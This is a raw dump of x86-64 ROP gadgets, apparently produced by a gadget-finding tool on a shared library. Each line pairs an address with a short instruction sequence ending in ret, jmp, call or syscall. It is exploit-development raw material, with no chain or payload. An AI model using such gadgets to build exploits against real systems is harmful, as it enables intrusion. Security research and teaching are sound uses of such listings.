0x00002aaaaab4b4d3 : add byte ptr [rax], al ; je 0x764e7 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4be78 : add byte ptr [rax], al ; je 0x76e87 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4d084 : add byte ptr [rax], al ; je 0x78097 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab5ba57 : add byte ptr [rax], al ; je 0x86a64 ; ret
0x00002aaaaab5d376 : add byte ptr [rax], al ; je 0x88384 ; ret
0x00002aaaaab5dcf9 : add byte ptr [rax], al ; je 0x88d0f ; lea rax, qword ptr [rip + 0x1777c] ; ret
0x00002aaaaab5dee6 : add byte ptr [rax], al ; je 0x88efc ; lea rax, qword ptr [rip + 0xe6dbf] ; ret
0x00002aaaaab5f5d9 : add byte ptr [rax], al ; je 0x8a5ef ; lea rax, qword ptr [rip + 0xda44c] ; ret
0x00002aaaaab5ff59 : add byte ptr [rax], al ; je 0x8af6f ; lea rax, qword ptr [rip + 0x1713c] ; ret
0x00002aaaaab61839 : add byte ptr [rax], al ; je 0x8c84f ; lea rax, qword ptr [rip + 0xd999c] ; ret
0x00002aaaaab637dc : add byte ptr [rax], al ; je 0x8e7f2 ; lea rax, qword ptr [rip + 0xbee69] ; ret
0x00002aaaaab63cc9 : add byte ptr [rax], al ; je 0x8ecdf ; lea rax, qword ptr [rip + 0xda08c] ; ret
0x00002aaaaab63de9 : add byte ptr [rax], al ; je 0x8edff ; lea rax, qword ptr [rip + 0xdb77c] ; ret
0x00002aaaaab68876 : add byte ptr [rax], al ; je 0x9387f ; ret
0x00002aaaaab6889e : add byte ptr [rax], al ; je 0x938b4 ; lea rax, qword ptr [rip + 0xbcb07] ; ret
0x00002aaaaab809b4 : add byte ptr [rax], al ; je 0xaba28 ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaaba1f0b : add byte ptr [rax], al ; je 0xccf5e ; mov eax, 0x20 ; ret
0x00002aaaaabbc8b6 : add byte ptr [rax], al ; je 0xe78f6 ; xor eax, eax ; ret
0x00002aaaaabca368 : add byte ptr [rax], al ; je 0xf5375 ; ret
0x00002aaaaac46d43 : add byte ptr [rax], al ; jg 0x171d56 ; neg eax ; ret
0x00002aaaaab800b3 : add byte ptr [rax], al ; jg 0xab0bf ; neg eax ; ret
0x00002aaaaac44c99 : add byte ptr [rax], al ; jl 0x16fca6 ; neg eax ; ret
0x00002aaaaac71fb2 : add byte ptr [rax], al ; jl 0x19cfdf ; add byte ptr [rax], al ; sbb byte ptr [rcx - 0x17], ah ; jmp rdx
0x00002aaaaac730b2 : add byte ptr [rax], al ; jl 0x19e0ee ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac730b2 : add byte ptr [rax], al ; jl 0x19e0f0 ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac76cb2 : add byte ptr [rax], al ; jl 0x1a1d2c ; add byte ptr [rax], al ; cwde ; adc ebp, ebp ; call rsi
0x00002aaaaac7afb2 : add byte ptr [rax], al ; jl 0x1a5f6f ; add byte ptr [rax], al ; js 0x1a5fdd ; cli ; call qword ptr [rax]
0x00002aaaaac7ebb2 : add byte ptr [rax], al ; jl 0x1a9bab ; add byte ptr [rax], al ; or byte ptr [rbx], al ; call rdi
0x00002aaaaac81fb2 : add byte ptr [rax], al ; jl 0x1acfdf ; add dword ptr [rax], eax ; js 0x1acf56 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac851b2 : add byte ptr [rax], al ; jl 0x1b0211 ; add dword ptr [rax], eax ; fdiv dword ptr [rbx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac86fb2 : add byte ptr [rax], al ; jl 0x1b202f ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac0c0d6 : add byte ptr [rax], al ; jle 0x1370f2 ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaac7240f : add byte ptr [rax], al ; jle 0x19d400 ; jmp qword ptr [rsi]
0x00002aaaaac6b6a6 : add byte ptr [rax], al ; jmp 0x1966b0
0x00002aaaaaafb66a : add byte ptr [rax], al ; jmp 0x26280
0x00002aaaaab3480f : add byte ptr [rax], al ; jmp 0x5baf4
0x00002aaaaab35850 : add byte ptr [rax], al ; jmp 0x5ca9b
0x00002aaaaab3c496 : add byte ptr [rax], al ; jmp 0x63700
0x00002aaaaab505dc : add byte ptr [rax], al ; jmp 0x7b5c2
0x00002aaaaab93b63 : add byte ptr [rax], al ; jmp 0xbad95
0x00002aaaaab93639 : add byte ptr [rax], al ; jmp 0xbe602
0x00002aaaaab0a325 : add byte ptr [rax], al ; jmp rax
0x00002aaaaac0666b : add byte ptr [rax], al ; jmp rcx
0x00002aaaaabe713c : add byte ptr [rax], al ; jne 0x112179 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5e149 : add byte ptr [rax], al ; jne 0x8915f ; lea rax, qword ptr [rip + 0xc] ; ret
0x00002aaaaab5ffa5 : add byte ptr [rax], al ; jne 0x8afbb ; lea rax, qword ptr [rip + 0x10] ; ret
0x00002aaaaab6300f : add byte ptr [rax], al ; jne 0x8e026 ; lea rax, qword ptr [rip + 0x26] ; ret
0x00002aaaaab63e35 : add byte ptr [rax], al ; jne 0x8ee4b ; lea rax, qword ptr [rip + 0x80] ; ret
0x00002aaaaab63e98 : add byte ptr [rax], al ; jne 0x8eeae ; lea rax, qword ptr [rip + 0xd] ; ret
0x00002aaaaab66125 : add byte ptr [rax], al ; jne 0x9113b ; lea rax, qword ptr [rip + 0x80] ; ret
0x00002aaaaab66188 : add byte ptr [rax], al ; jne 0x9119e ; lea rax, qword ptr [rip + 0xd] ; ret
0x00002aaaaab6888a : add byte ptr [rax], al ; jne 0x938a1 ; lea rax, qword ptr [rip + 0xb3db] ; ret
0x00002aaaaab800df : add byte ptr [rax], al ; jne 0xab0f6 ; lea rax, qword ptr [rip + 0xf596] ; ret
0x00002aaaaab80caf : add byte ptr [rax], al ; jne 0xabcc6 ; lea rax, qword ptr [rip + 0xe916] ; ret
0x00002aaaaaba1ddf : add byte ptr [rax], al ; jne 0xccdb0 ; ret
0x00002aaaaaba1fee : add byte ptr [rax], al ; jne 0xccfd1 ; xor eax, eax ; ret
0x00002aaaaabab76a : add byte ptr [rax], al ; jne 0xd66c0 ; pop rbx ; ret
0x00002aaaaac7220e : add byte ptr [rax], al ; jns 0x19d201 ; jmp qword ptr [rcx]
0x00002aaaaac7b98e : add byte ptr [rax], al ; jo 0x1a6a0a ; out dx, eax ; call rax
0x00002aaaaac7f0de : add byte ptr [rax], al ; jo 0x1aa0fc ; jmp qword ptr [rcx]
0x00002aaaaac86f82 : add byte ptr [rax], al ; jo 0x1b1f91 ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac9076f : add byte ptr [rax], al ; jp 0x1bb76f ; call qword ptr [rcx]
0x00002aaaaac71dd6 : add byte ptr [rax], al ; js 0x19ce36 ; jmp 0x1b90e4
0x00002aaaaac7afb6 : add byte ptr [rax], al ; js 0x1a5fd9 ; cli ; call qword ptr [rax]
0x00002aaaaac7d786 : add byte ptr [rax], al ; js 0x1a87b4 ; int1 ; jmp qword ptr [rcx]
0x00002aaaaac7d806 : add byte ptr [rax], al ; js 0x1a8834 ; int1 ; call qword ptr [rcx]
0x00002aaaaac7e986 : add byte ptr [rax], al ; js 0x1a9988 ; int1 ; call rsi
0x00002aaaaaba2045 : add byte ptr [rax], al ; js 0xcd055 ; ret
0x00002aaaaac90b14 : add byte ptr [rax], al ; lea eax, dword ptr [rdi] ; rol byte ptr [rcx], cl ; ret 0xa
0x00002aaaaac90abc : add byte ptr [rax], al ; lea ecx, dword ptr [rax] ; rol byte ptr [rcx], cl ; ret 0xb
0x00002aaaaab4a1a0 : add byte ptr [rax], al ; lea r9, qword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x00002aaaaac00f91 : add byte ptr [rax], al ; lea r9, qword ptr [rsp + 0x18] ; call qword ptr [rax]
0x00002aaaaab4a0bd : add byte ptr [rax], al ; lea r9, qword ptr [rsp + 0x18] ; mov rdi, r12 ; call rbx
0x00002aaaaac01378 : add byte ptr [rax], al ; lea r9, qword ptr [rsp + 0x30] ; call qword ptr [rax]
0x00002aaaaac02698 : add byte ptr [rax], al ; lea rax, qword ptr [rbx + 0x2260] ; pop rbx ; ret
0x00002aaaaac44f7e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xa] ; ret
0x00002aaaaac44f8e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xb] ; ret
0x00002aaaaac44f9e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaac44fae : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xd] ; ret
0x00002aaaaac44fbe : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xe] ; ret
0x00002aaaaac44edd : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaac44efe : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaac44f0e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 2] ; ret
0x00002aaaaac44f1e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaac44f2e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaac44f3e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 5] ; ret
0x00002aaaaac44f4e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaac44e8a : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaac44f5e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 8] ; ret
0x00002aaaaac44f6e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 9] ; ret
0x00002aaaaab8088b : add byte ptr [rax], al ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaab809ee : add byte ptr [rax], al ; lea rax, qword ptr [rdi - 0xc] ; ret
0x00002aaaaab80a0e : add byte ptr [rax], al ; lea rax, qword ptr [rdi - 4] ; ret
0x00002aaaaab809fe : add byte ptr [rax], al ; lea rax, qword ptr [rdi - 8] ; ret
0x00002aaaaac44eee : add byte ptr [rax], al ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaab01b36 : add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x15f406] ; ret
0x00002aaaaaaf592e : add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x16b154] ; ret
0x00002aaaaaaf593e : add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x16d066] ; ret
0x00002aaaaabff4fe : add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x61a3e] ; ret
0x00002aaaaabf4b1e : add byte ptr [rax], al ; lea rdi, qword ptr [rip + 0x2a7bd5] ; call rax
0x00002aaaaab1a0dc : add byte ptr [rax], al ; lea rsi, qword ptr [rip + 0x1cb] ; call rax
0x00002aaaaab44217 : add byte ptr [rax], al ; lea rsi, qword ptr [rip + 0x30] ; call rax
0x00002aaaaab50f07 : add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x15e0] ; call rax
0x00002aaaaab512f7 : add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x19d0] ; call rax
0x00002aaaaab51747 : add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x1e20] ; call rax
0x00002aaaaab44510 : add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x2c9] ; call rax
0x00002aaaaab4fc37 : add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x310] ; call rax
0x00002aaaaab4fea7 : add byte ptr [rax], al ; lea rsi, qword ptr [rip - 0x580] ; call rax
0x00002aaaaab0e8bf : add byte ptr [rax], al ; lea rsp, qword ptr [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret
0x00002aaaaac84ee2 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; add qword ptr [r8], r8 ; clc ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7afe2 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; mov al, 0 ; add byte ptr [rax], bl ; push rsp ; cli ; call qword ptr [rax]
0x00002aaaaac853e2 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; push rsp ; add dword ptr [rax], eax ; pop rax ; js 0x1b03e9 ; jmp qword ptr [rbx]
0x00002aaaaac7c1e2 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; ret 0
0x00002aaaaac5efe7 : add byte ptr [rax], al ; loope 0x189ff5 ; add byte ptr [rcx], al ; adc byte ptr [rax], al ; add byte ptr [rax], al ; ret 1
0x00002aaaaac7ad7e : add byte ptr [rax], al ; loopne 0x1a5d0f ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac7adae : add byte ptr [rax], al ; loopne 0x1a5d3f ; out dx, al ; jmp rbx
0x00002aaaaac7b7ce : add byte ptr [rax], al ; loopne 0x1a67d8 ; out dx, eax ; jmp rsi
0x00002aaaaac7f06e : add byte ptr [rax], al ; loopne 0x1aa08b ; call qword ptr [rdx]
0x00002aaaaac90ac8 : add byte ptr [rax], al ; loopne 0x1bbadb ; ret 0xb
0x00002aaaaac90b20 : add byte ptr [rax], al ; loopne 0x1bbb32 ; ret 0xa
0x00002aaaaaadaebe : add byte ptr [rax], al ; loopne 0x5ecc ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x26
0x00002aaaaac811ea : add byte ptr [rax], al ; mov ah, 0x12 ; add dword ptr [rax], eax ; and dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac718ea : add byte ptr [rax], al ; mov ah, 0x19 ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; call qword ptr [rbx]
0x00002aaaaac81bea : add byte ptr [rax], al ; mov ah, 0x1c ; add dword ptr [rax], eax ; mov al, 0x87 ; hlt ; call qword ptr [rax]
0x00002aaaaac72fea : add byte ptr [rax], al ; mov ah, 0x30 ; add byte ptr [rax], al ; ret 0xffe9
0x00002aaaaac82fea : add byte ptr [rax], al ; mov ah, 0x30 ; add dword ptr [rax], eax ; jrcxz 0x1adff0 ; call qword ptr [rsi]
0x00002aaaaac73dea : add byte ptr [rax], al ; mov ah, 0x3e ; add byte ptr [rax], al ; cli ; jmp qword ptr [rcx]
0x00002aaaaac849ea : add byte ptr [rax], al ; mov ah, 0x4a ; add dword ptr [rax], eax ; push rax ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac74bea : add byte ptr [rax], al ; mov ah, 0x4c ; add byte ptr [rax], al ; adc byte ptr [rax - 0x15], dl ; call rdi
0x00002aaaaac84bea : add byte ptr [rax], al ; mov ah, 0x4c ; add dword ptr [rax], eax ; add byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac6ba2e : add byte ptr [rax], al ; mov ah, 0xa0 ; in eax, dx ; jmp rsp
0x00002aaaaac6bbce : add byte ptr [rax], al ; mov ah, 0xd0 ; in eax, dx ; call rsp
0x00002aaaaac7dede : add byte ptr [rax], al ; mov al, 0x95 ; int1 ; call qword ptr [rax]
0x00002aaaaac7e44e : add byte ptr [rax], al ; mov al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaac79a5e : add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaac5c49e : add byte ptr [rax], al ; mov al, 4 ; inc eax ; add al, 0xf2 ; call rax
0x00002aaaaac3f3fe : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x00002aaaaac3b0ce : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00002aaaaac3b0de : add byte ptr [rax], al ; mov ax, word ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x00002aaaaac7aef6 : add byte ptr [rax], al ; mov bh, bh ; stc ; call qword ptr [rax]
0x00002aaaaab7317e : add byte ptr [rax], al ; mov byte ptr [rcx], 0 ; mov rcx, r8 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaac3d09e : add byte ptr [rax], al ; mov byte ptr [rcx], dl ; ret
0x00002aaaaaba9d5e : add byte ptr [rax], al ; mov byte ptr [rdi + 8], 0x15 ; mov eax, 1 ; ret
0x00002aaaaaba9d8e : add byte ptr [rax], al ; mov byte ptr [rdi + 8], 0x19 ; mov eax, 1 ; ret
0x00002aaaaaba9dfe : add byte ptr [rax], al ; mov byte ptr [rdi + 8], 0x1c ; mov eax, 2 ; ret
0x00002aaaaaba9d2e : add byte ptr [rax], al ; mov byte ptr [rdi + 8], 2 ; xor eax, eax ; ret
0x00002aaaaab72e0e : add byte ptr [rax], al ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x00002aaaaab7b77e : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x00002aaaaab7a17e : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x00002aaaaab7b14e : add byte ptr [rax], al ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac7a846 : add byte ptr [rax], al ; mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaab7a19e : add byte ptr [rax], al ; mov cx, word ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x00002aaaaac91b82 : add byte ptr [rax], al ; mov dh, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 5
0x00002aaaaab7c59e : add byte ptr [rax], al ; mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; lea rax, qword ptr [rdi + 1] ; ret
0x00002aaaaab7ae4e : add byte ptr [rax], al ; mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaab7e00e : add byte ptr [rax], al ; mov dl, byte ptr [rsi] ; mov byte ptr [rdi], dl ; xor ch, ch ; mov byte ptr [rdi + 1], ch ; ret
0x00002aaaaab93631 : add byte ptr [rax], al ; mov dword ptr [r12], 1 ; jmp 0xbe60a
0x00002aaaaab4e830 : add byte ptr [rax], al ; mov dword ptr [rbx + 0x70], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab47b7b : add byte ptr [rax], al ; mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac3d0de : add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov byte ptr [rcx + 4], dl ; ret
0x00002aaaaac3d0fe : add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov dword ptr [rcx + 3], edx ; ret
0x00002aaaaac3d0ee : add byte ptr [rax], al ; mov dword ptr [rcx], edx ; mov word ptr [rcx + 4], dx ; ret
0x00002aaaaac3d0ce : add byte ptr [rax], al ; mov dword ptr [rcx], edx ; ret
0x00002aaaaabca38e : add byte ptr [rax], al ; mov dword ptr [rdi + 4], esi ; xor eax, eax ; ret
0x00002aaaaab7b16e : add byte ptr [rax], al ; mov dword ptr [rdi - 1], edx ; ret
0x00002aaaaab72e4e : add byte ptr [rax], al ; mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 4], 0 ; mov rax, rdi ; ret
0x00002aaaaab72dfe : add byte ptr [rax], al ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 4], r8d ; mov rax, rdi ; ret
0x00002aaaaab72e3e : add byte ptr [rax], al ; mov dword ptr [rdi], ecx ; mov rax, rdi ; ret
0x00002aaaaab72dee : add byte ptr [rax], al ; mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; mov rax, rdi ; ret
0x00002aaaaab7b18e : add byte ptr [rax], al ; mov dword ptr [rdi], edx ; mov byte ptr [rdi + 4], dl ; ret
0x00002aaaaab7b19e : add byte ptr [rax], al ; mov dword ptr [rdi], edx ; mov word ptr [rdi + 4], dx ; ret
0x00002aaaaab7b17e : add byte ptr [rax], al ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab2a765 : add byte ptr [rax], al ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaac01d8e : add byte ptr [rax], al ; mov dword ptr [rsi], 0xa ; ret
0x00002aaaaac01d7e : add byte ptr [rax], al ; mov dword ptr [rsi], 0xb ; ret
0x00002aaaaac01dae : add byte ptr [rax], al ; mov dword ptr [rsi], 0xc ; ret
0x00002aaaaac01d9e : add byte ptr [rax], al ; mov dword ptr [rsi], 8 ; ret
0x00002aaaaabcac14 : add byte ptr [rax], al ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab9e220 : add byte ptr [rax], al ; mov dword ptr fs:[rdx], esi ; add rsp, 0x18 ; ret
0x00002aaaaab9e2ea : add byte ptr [rax], al ; mov dword ptr fs:[rdx], esi ; add rsp, 8 ; ret
0x00002aaaaab7a18e : add byte ptr [rax], al ; mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaab5bbee : add byte ptr [rax], al ; mov eax, 0x16 ; ret
0x00002aaaaaba168e : add byte ptr [rax], al ; mov eax, 0x66 ; syscall ; ret
0x00002aaaaaba16ae : add byte ptr [rax], al ; mov eax, 0x68 ; syscall ; ret
0x00002aaaaaba169e : add byte ptr [rax], al ; mov eax, 0x6b ; syscall ; ret
0x00002aaaaaba16be : add byte ptr [rax], al ; mov eax, 0x6c ; syscall ; ret
0x00002aaaaaba18ce : add byte ptr [rax], al ; mov eax, 0x6f ; syscall ; ret
0x00002aaaaaba1da9 : add byte ptr [rax], al ; mov eax, 0x7f ; ret
0x00002aaaaab907be : add byte ptr [rax], al ; mov eax, 0xc9 ; syscall ; ret
0x00002aaaaabe94d0 : add byte ptr [rax], al ; mov eax, 0xca ; syscall ; pop rdx ; pop rsi ; ret
0x00002aaaaabdbbfe : add byte ptr [rax], al ; mov eax, 0xe4 ; syscall ; ret
0x00002aaaaaba1e6e : add byte ptr [rax], al ; mov eax, 0xfc17 ; ret
0x00002aaaaab0ecec : add byte ptr [rax], al ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabed99a : add byte ptr [rax], al ; mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00002aaaaab08f0c : add byte ptr [rax], al ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab0a48c : add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00002aaaaabd3bd3 : add byte ptr [rax], al ; mov eax, 1 ; add rsp, 8 ; ret
0x00002aaaaac46d3e : add byte ptr [rax], al ; mov eax, 1 ; jg 0x171d5b ; neg eax ; ret
0x00002aaaaab800ae : add byte ptr [rax], al ; mov eax, 1 ; jg 0xab0c4 ; neg eax ; ret
0x00002aaaaabff45e : add byte ptr [rax], al ; mov eax, 1 ; pop rbx ; ret
0x00002aaaaab1f0b4 : add byte ptr [rax], al ; mov eax, 1 ; ret
0x00002aaaaac024ae : add byte ptr [rax], al ; mov eax, 2 ; ret
0x00002aaaaabda3da : add byte ptr [rax], al ; mov eax, dword ptr [rax + 0x38] ; test eax, eax ; cmove eax, edx ; ret
0x00002aaaaac3f43e : add byte ptr [rax], al ; mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 3] ; ret
0x00002aaaaac067ce : add byte ptr [rax], al ; mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaac427ee : add byte ptr [rax], al ; mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x00002aaaaab5185e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x00002aaaaabe959e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x10] ; test eax, eax ; jne 0x1145ba ; ret
0x00002aaaaac01cdc : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x20] ; mov dword ptr [rsi + 8], eax ; ret
0x00002aaaaab8002e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x24] ; cmp eax, dword ptr [rsi + 0x24] ; jne 0xab0ba ; ret
0x00002aaaaac1056e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x28] ; ret
0x00002aaaaab8007e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x34] ; cmp eax, dword ptr [rsi + 0x34] ; jne 0xab0ba ; ret
0x00002aaaaabab65e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x4c] ; ret
0x00002aaaaabca37e : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 4] ; mov dword ptr [rsi], eax ; xor eax, eax ; ret
0x00002aaaaab4c42e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; and eax, 0x200 ; ret
0x00002aaaaab4c3fe : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; and eax, 0x804 ; ret
0x00002aaaaab4cf0e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; shr eax, 5 ; and eax, 1 ; ret
0x00002aaaaab4962e : add byte ptr [rax], al ; mov eax, dword ptr [rdx] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4802e : add byte ptr [rax], al ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab0b87e : add byte ptr [rax], al ; mov eax, dword ptr [rip + 0x38c802] ; ret
0x00002aaaaaba06be : add byte ptr [rax], al ; mov eax, dword ptr [rsp] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab451e1 : add byte ptr [rax], al ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabcb8bd : add byte ptr [rax], al ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab447d8 : add byte ptr [rax], al ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0a96f : add byte ptr [rax], al ; mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab30772 : add byte ptr [rax], al ; mov eax, ecx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaaaf622c : add byte ptr [rax], al ; mov eax, edi ; ret
0x00002aaaaabe13cb : add byte ptr [rax], al ; mov eax, edx ; add rsp, 8 ; ret
0x00002aaaaab29e52 : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; ret
0x00002aaaaaaf68a3 : add byte ptr [rax], al ; mov eax, edx ; ret
0x00002aaaaabeae1f : add byte ptr [rax], al ; mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabeaff8 : add byte ptr [rax], al ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab40631 : add byte ptr [rax], al ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab46035 : add byte ptr [rax], al ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaac51822 : add byte ptr [rax], al ; mov ebp, 0xc000000f ; sldt word ptr [rax] ; ret
0x00002aaaaac0743a : add byte ptr [rax], al ; mov ebp, eax ; call 0x12e716
0x00002aaaaac6b9c6 : add byte ptr [rax], al ; mov ebp, gs ; jmp rsp
0x00002aaaaab7a1be : add byte ptr [rax], al ; mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab00e3f : add byte ptr [rax], al ; mov ecx, ebx ; movsxd rcx, dword ptr [r8 + rcx*4] ; add rcx, r8 ; jmp rcx
0x00002aaaaab50a05 : add byte ptr [rax], al ; mov ecx, edx ; xor edx, edx ; mov rax, qword ptr [rax + 0x48] ; jmp rax
0x00002aaaaac7f1c2 : add byte ptr [rax], al ; mov edx, dr0 ; add byte ptr [rax], al ; clc ; sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaabecaad : add byte ptr [rax], al ; mov edx, dword ptr [rbx] ; jmp 0x117a7a
0x00002aaaaac2f50e : add byte ptr [rax], al ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaab7c5de : add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab7a1ae : add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab7e04e : add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; xor ch, ch ; mov byte ptr [rdi + 4], ch ; ret
0x00002aaaaab45103 : add byte ptr [rax], al ; mov edx, eax ; je 0x70119 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab461f5 : add byte ptr [rax], al ; mov edx, eax ; jmp 0x7118d
0x00002aaaaab46386 : add byte ptr [rax], al ; mov edx, eax ; jmp 0x71324
0x00002aaaaab4abe1 : add byte ptr [rax], al ; mov edx, eax ; jmp 0x75b82
0x00002aaaaab4b531 : add byte ptr [rax], al ; mov edx, eax ; jmp 0x764d2
0x00002aaaaab4a511 : add byte ptr [rax], al ; mov edx, eax ; mov eax, edx ; pop rbx ; ret
0x00002aaaaabd7aa4 : add byte ptr [rax], al ; mov esi, 1 ; call rbx
0x00002aaaaabd7c91 : add byte ptr [rax], al ; mov esi, 1 ; mov rdi, r12 ; call rbx
0x00002aaaaabd7b5d : add byte ptr [rax], al ; mov esi, 1 ; mov rdi, r13 ; call rbx
